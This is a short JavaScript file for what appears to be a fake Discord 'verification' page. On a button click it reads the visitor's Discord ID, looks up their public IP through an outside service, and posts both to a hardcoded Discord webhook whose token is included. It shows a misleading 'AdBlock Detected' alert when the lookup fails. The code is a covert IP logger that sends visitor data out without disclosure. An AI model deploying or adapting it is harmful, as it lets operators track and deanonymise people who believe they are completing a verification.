function httpGet(theUrl)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false );
    xmlHttp.send( null );
    return xmlHttp.responseText;
}





document.getElementById('button').addEventListener("click", function() {
    var balls = document.getElementById('discordid').value;
    try{
        publicIp = httpGet("https://api.ipify.org/");
    } catch (error) {
        alert("AdBlock Detected.")
        location.reload()
    }

    document.getElementById('button').addEventListener("click", function() {
        var balls = document.getElementById('discordid').value;
        var url = "https://discordapp.com/api/webhooks/1033450138678607913/oNUp3ukzPbCEd6buK9Z1FUaxFio8iqbpDHng_-O7EBUODFiz5YmM8yiBAaSyg446OoZq";
        var request = new XMLHttpRequest();
        request.open("POST", url);
        request.setRequestHeader('Content-type', 'application/json');
    
        var myEmbed2 = {
            "title": "Verification log",
            
            "color": 15258703,
            "fields": [
                {
                    "name": "Discord ID",
                    "value": balls,
                    "inline": true
                },
                {
                    "name": "IP",
                    "value": publicIp,
                    "inline": true
                },
            ],
        }
        
        var params = {
            username: "MuflieBot",
            embeds: [ myEmbed2 ]
        }
        
        request.send(JSON.stringify(params));  
        
    
    });
    
    
});


